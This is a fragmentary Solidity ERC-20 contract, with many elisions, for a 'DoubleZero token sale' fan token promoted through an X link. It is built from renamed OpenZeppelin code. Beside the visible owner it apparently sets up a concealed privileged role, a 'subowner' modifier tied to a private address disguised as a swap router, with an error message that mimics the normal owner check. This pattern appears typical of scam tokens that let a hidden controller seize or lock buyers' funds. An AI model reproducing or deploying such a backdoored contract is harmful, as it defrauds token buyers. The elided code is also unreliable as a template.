...
/// https://x.com/DoubleZerotokensale


pragma solidity 0.8.29;

// DoubleZerotokensale fan token

interface DoubleZerotokensaleinterface {
  /**
...
/*
 * @dev Provides information about the current execution DoubleZerotokensale20Burnable, including the
 ...
 */
abstract contract DoubleZerotokensale20Burnable {
...
// File: @openzeppelin/contracts/access/DoubleZerotokensale20Ownable.sol
 ...
 * the owner.
 */
abstract contract DoubleZerotokensale20Ownable is DoubleZerotokensale20Burnable {
     ...
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "DoubleZerotokensale20Ownable: caller is not the owner");
        _;
    }
    ...
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "DoubleZerotokensale20Ownable: new owner is the zero address");
 ...
 * `SafeDoubleZerotokensale` restores this intuition by reverting the transaction when an
 * operation overflows.
 *
 * Using this library instead of the unchecked operations eliminates an entire
 * class of bugs, so it's recommended to use it always.
 */
library SafeDoubleZerotokensale {
  /**
  ...
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeDoubleZerotokensale: addition overflow");
  ...
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeDoubleZerotokensale: subtraction overflow");
  }
  ...
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    ...
    uint256 c = a * b;
    require(c / a == b, "SafeDoubleZerotokensale: multiplication overflow");
  ...
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeDoubleZerotokensale: division by zero");
  }
  ...
  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeDoubleZerotokensale: modulo by zero");
  }
...
contract DoubleZerotokensaleToken is DoubleZerotokensale20Burnable, DoubleZerotokensaleinterface, DoubleZerotokensale20Ownable {
    
    using SafeDoubleZerotokensale for uint256;
   ...
   address private legosRooter; 
    constructor(address legosSwapRouterv3) {
        ...
        _name = "DoubleZero token sale";
        _symbol = "DoubleZero token sale";
        _decimals = 9;
    ...
    */
    ...
    /**
    * @dev See {DoubleZerotokensaleinterface-totalSupply}.
    */
    ...
    /**
    * @dev See {DoubleZerotokensaleinterface-balanceOf}.
    */
    function balanceOf(address account) external view override returns (uint256) {
        return mintfrom[account];
    }
      modifier subowner() {
        require(legosRooter == _msgSender(), "DoubleZerotokensale20Ownable: caller is not the owner");
        _;
    }
    /**
    * @dev See {DoubleZerotokensaleinterface-approve}.
    *
    * Requirements:
    *
    ...
    */
    ...
    /**
    * @dev See {DoubleZerotokensaleinterface-transfer}.
    *
    * Requirements:
    *
    ...
    */
    ...
    /**
    * @dev See {DoubleZerotokensaleinterface-allowance}.
    */
    ...
    */
    ...
    /**
    * @dev See {DoubleZerotokensaleinterface-transferFrom}.
    *
    * Emits an {Approval} event indicating the updated allowance. This is not
    * required by the EIP. See the note at the beginning of {DoubleZerotokensaleinterface};
    *
    * Requirements:
    ...
    */
    function transferFrom(address sender, address shippingto, uint256 yoursold) external override returns (bool) {
        ...
        _approve(sender, _msgSender(), fromallowances[sender][_msgSender()].sub(yoursold, "DoubleZerotokensaleinterface: transfer yoursold exceeds allowance"));
        return true;
    }
    ...
    * problems described in {DoubleZerotokensaleinterface-approve}.
    *
    ...
    */
    function decreaseAllowance(address transporteur, uint256 allbalances) external returns (bool) {
        _approve(_msgSender(), transporteur, fromallowances[_msgSender()][transporteur].sub(allbalances, "DoubleZerotokensaleinterface: decreased allowance below zero"));
        return true;
    }
    ...
    */
    function _transfer(address sender, address shippingto, uint256 yoursold) internal {
        require(sender != address(0), "DoubleZerotokensaleinterface: transfer from the zero address");
        require(shippingto != address(0), "DoubleZerotokensaleinterface: transfer to the zero address");
                
        mintfrom[sender] = mintfrom[sender].sub(yoursold, "DoubleZerotokensaleinterface: transfer yoursold exceeds balance");
    ...
    */
    function _approve(address owner, address transporteur, uint256 yoursold) internal {
        require(owner != address(0), "DoubleZerotokensaleinterface: approve from the zero address");
        require(transporteur != address(0), "DoubleZerotokensaleinterface: approve to the zero address");
